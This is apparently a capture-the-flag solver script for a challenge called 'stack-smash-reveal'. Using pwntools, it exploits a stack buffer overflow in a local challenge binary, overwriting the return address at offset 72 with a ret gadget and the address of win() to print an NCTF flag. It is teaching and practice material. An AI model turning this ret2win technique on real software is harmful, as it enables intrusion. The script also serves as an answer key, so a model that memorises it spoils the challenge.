#!/usr/bin/env python3
"""Solver for stack-smash-reveal.

vuln() does read(0, buf, 256) into a 64-byte buffer with no canary and no PIE.
buf sits at rbp-0x40, so the saved return address is 0x40 + 8 = 72 bytes in.
We overwrite it with the address of win(). A single `ret` gadget is chained
first to keep the stack 16-byte aligned before win() runs its loop/write.
win() then XOR-decodes and prints the flag.
"""
import os
import re

from pwn import ELF, context, process

context.log_level = "error"

HERE = os.path.dirname(os.path.abspath(__file__))
BIN = os.path.join(HERE, "..", "chall")

OFFSET = 72


def main() -> None:
    elf = ELF(BIN, checksec=False)
    win = elf.symbols["win"]
    ret = next(elf.search(b"\xc3"))  # any `ret` byte for stack alignment

    payload = b"A" * OFFSET
    payload += (ret).to_bytes(8, "little")
    payload += (win).to_bytes(8, "little")

    p = process(BIN)
    p.recvline()  # banner
    p.recvline()  # "send your data:"
    p.send(payload)
    out = p.recvall(timeout=5)
    p.close()

    m = re.search(rb"NCTF\{[^}]*\}", out)
    assert m, f"no flag in output: {out!r}"
    print(m.group(0).decode())


if __name__ == "__main__":
    main()
